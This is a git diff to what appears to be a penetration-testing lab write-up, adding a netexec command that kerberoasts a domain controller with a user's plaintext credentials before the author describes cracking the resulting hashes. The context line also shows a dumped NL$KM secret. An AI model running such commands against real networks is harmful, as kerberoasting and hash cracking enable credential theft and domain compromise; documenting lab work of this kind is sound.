@@ -81,6 +81,10 @@ NL$KM:f19f8d0a3d6b2d1369962e4c324dc366d53697ab1f0bf238113edf05aedf3170c0e397a008
 
 Then i kerberoasted the DC with the creds of eric and had 2 hashes:
 
+```
+nxc ldap 10.10.97.0/24 -u Eric.Wallows -p EricLikesRunning800 --kerberoasting kerb.out
+```
+
 <figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 O was able to crack the 2 hashes and got password&#x20;
